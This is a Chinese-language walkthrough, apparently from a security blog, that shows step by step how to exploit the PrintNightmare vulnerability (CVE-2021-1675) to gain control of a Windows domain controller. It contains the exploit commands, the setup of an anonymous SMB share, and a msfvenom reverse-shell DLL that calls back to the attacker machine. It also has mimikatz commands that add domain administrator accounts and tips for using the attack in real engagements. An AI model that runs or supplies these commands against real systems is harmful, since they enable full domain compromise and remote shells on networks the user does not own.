## 前言

攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序，若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。

## 利用条件

  * 一个普通的域用户
  * 开启Spooler服务（默认开启）

![1671515974_63a14f4684dc84730a7ef.png!small?1671515974968](https://image.3001.net/images/20221220/1671515974_63a14f4684dc84730a7ef.png!small?1671515974968)

![1671515999_63a14f5fbb2c6b4da770b.png!small?1671516000638](https://image.3001.net/images/20221220/1671515999_63a14f5fbb2c6b4da770b.png!small?1671516000638)

### 环境准备

域控 : windows server 2019 （10.1.19.2）

攻击机：kali（10.1.19.131）

安装impacket

    
    
    git clone https://github.com/cube0x0/impacket
    cd impacket
    python3 ./setup.py install

下载exp

    
    
    cd ~/
    git clone https://github.com/cube0x0/CVE-2021-1675.git
    cd CVE-2021-1675

###

### 配置smb服务

#### linux

vim /etc/samba/smb.conf

    
    
    [global]
        map to guest = Bad User
        server role = standalone server
        usershare allow guests = yes
        idmap config * : backend = tdb
        smb ports = 445
    
    [smb]
        comment = Samba
        path = /tmp/
        guest ok = yes
        read only = no
        browsable = yes

service smbd start

#### windows

    
    
    1.启用Guest用户   
    net user guest /active:yes
    2.将Everyone权限应用于匿名用户
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
    3.指定匿名共享文件的位置
    REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d smb /f
    4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除
    导出组策略：
    secedit /export /cfg gp.inf /quiet
    修改文件gp.inf，将SeDenyNetworkLogonRight = Guest修改为SeDenyNetworkLogonRight =，保存
    重新导入组策略：
    secedit /configure /db gp.sdb /cfg gp.inf /quiet
    强制刷新组策略，立即生效(否则，重启后生效)：
    gpupdate/force
    5.设置文件共享
    icacls C:\share\ /T /grant Everyone:r
    net share share=c:\share /grant:everyone,full

完整的Powershell代码已开源：[https://github.com/3gstudent/Invoke-BuildAnonymousSMBServe](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer)

支持域环境和工作组环境的Windows操作系统

需要本地管理员权限执行

代码在以下操作系统测试成功：

    
    
    Windows 7
    Windows 8
    Windows 10
    Windows Server 2012
    Windows Server 2012 R2
    Windows Server 2016

开启可匿名访问的文件共享服务器：

    
    
    Import-module Invoke-BuildAnonymousSMBServer.ps
    Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable

关闭可匿名访问的文件共享服务器：

    
    
    Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable

关闭可匿名访问的文件共享服务器实现了以下操作：

  * 关闭指定目录的共享权限
  * 禁用Guest用户
  * 禁用将Everyone权限应用于匿名用户
  * 删除组策略中指定的匿名共享文件位置
  * 将Guest用户添加至策略“拒绝从网络访问这台计算机”

使用windows开启smb服务的时候，需要先创建共享文件夹，然后再执行powershell脚本开启smb共享

![1671516210_63a15032799f153a14106.png!small?1671516211589](https://image.3001.net/images/20221220/1671516210_63a15032799f153a14106.png!small?1671516211589)

![1671516221_63a1503d2f41d90596b3a.png!small?1671516221612](https://image.3001.net/images/20221220/1671516221_63a1503d2f41d90596b3a.png!small?1671516221612)

## 检测

使用impacket套件检测

    
    
    python3 rpcdump.py @192.168.2.118 | findstr MS-RPRN

若存在漏洞，则显示

    
    
    Protocol: [MS-RPRN]: Print System Remote Protocol

###

## 漏洞利用

#### 上线msf，生成dll和启动msf。

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.19.131 LPORT=5555 -f dll -o /tmp/rever.dll
    msfconsole
    use exploit/multi/handler 
    set payload windows/x64/meterpreter/reverse_tcp
    set LPORT 5555
    set LHOST 10.1.19.131
    run
    
    
    python3 CVE-2021-1675.py test19.god/user4a:1qaz@WSX@10.1.19.2 '\\10.1.19.131\smb\rever.dll'

![1671516299_63a1508be82a0ab8e29b5.png!small?1671516300603](https://image.3001.net/images/20221220/1671516299_63a1508be82a0ab8e29b5.png!small?1671516300603)

![1671516314_63a1509aa84eacd0d0353.png!small?1671516315302](https://image.3001.net/images/20221220/1671516314_63a1509aa84eacd0d0353.png!small?1671516315302)

#### 新建域管账号，利用linux开启smb共享，生成dll文件。

![1671516372_63a150d49830a7fcea8a3.png!small?1671516373375](https://image.3001.net/images/20221220/1671516372_63a150d49830a7fcea8a3.png!small?1671516373375)

开始攻击。

![1671516385_63a150e14466b8daacb63.png!small?1671516386105](https://image.3001.net/images/20221220/1671516385_63a150e14466b8daacb63.png!small?1671516386105)

在域控上查看，成功新增域管账号。

![1671516436_63a15114cdd55cae3d368.png!small?1671516437705](https://image.3001.net/images/20221220/1671516436_63a15114cdd55cae3d368.png!small?1671516437705)

利用win开启smb共享。

![1671516465_63a1513183f31166ba85a.png!small?1671516466340](https://image.3001.net/images/20221220/1671516465_63a1513183f31166ba85a.png!small?1671516466340)

![1671516476_63a1513c2c8df0ba86cb6.png!small?1671516476688](https://image.3001.net/images/20221220/1671516476_63a1513c2c8df0ba86cb6.png!small?1671516476688)

#### 本地提权新建管理员用户，生成dll文件。

![1671516514_63a151625699b34abf7f2.png!small?1671516515015](https://image.3001.net/images/20221220/1671516514_63a151625699b34abf7f2.png!small?1671516515015)

![1671516528_63a15170ca7bd21757c8b.png!small?1671516529479](https://image.3001.net/images/20221220/1671516528_63a15170ca7bd21757c8b.png!small?1671516529479)

![1671516542_63a1517ee3e4ae51daf58.png!small?1671516543572](https://image.3001.net/images/20221220/1671516542_63a1517ee3e4ae51daf58.png!small?1671516543572)

#### mimikatz 添加域管

在域内直接使用。

    
    
    misc::printnightmare /server:test19.god /library:\\10.1.19.12\smb\111.dll

成功添加域管。

![1671516586_63a151aadde0e58771136.png!small?1671516587656](https://image.3001.net/images/20221220/1671516586_63a151aadde0e58771136.png!small?1671516587656)

![1671516609_63a151c1da64bea9bb229.png!small?1671516610457](https://image.3001.net/images/20221220/1671516609_63a151c1da64bea9bb229.png!small?1671516610457)

在工作组中

    
    
    misc::printnightmare /library:\\10.1.19.12\smb\222.dll /server:10.1.19.2 /authuser:user4a /authdomain:test19.god /authpassword:1qaz@WSX

![1671516637_63a151dd98eaf7413e405.png!small?1671516638722](https://image.3001.net/images/20221220/1671516637_63a151dd98eaf7413e405.png!small?1671516638722)

查看域控。

![1671516656_63a151f0f2f1c7ff74d55.png!small?1671516657654](https://image.3001.net/images/20221220/1671516656_63a151f0f2f1c7ff74d55.png!small?1671516657654)

## 总结

> 上传mimikatz的时候，需要将整个文件夹上传，不然有时候使用会报错。
>
> cve-2021-1675这个漏洞不能一直打，打印机服务成功一次之后，不久后会崩溃。如果在实战中，上线后应该迁移进程。
>
> 使用mimikatz，在域内可以不用指定域账号，在工作组中，需要指定。
>
> smb共享使用win或者linux都行
>
> shell 乱码可以改正：chcp 65001

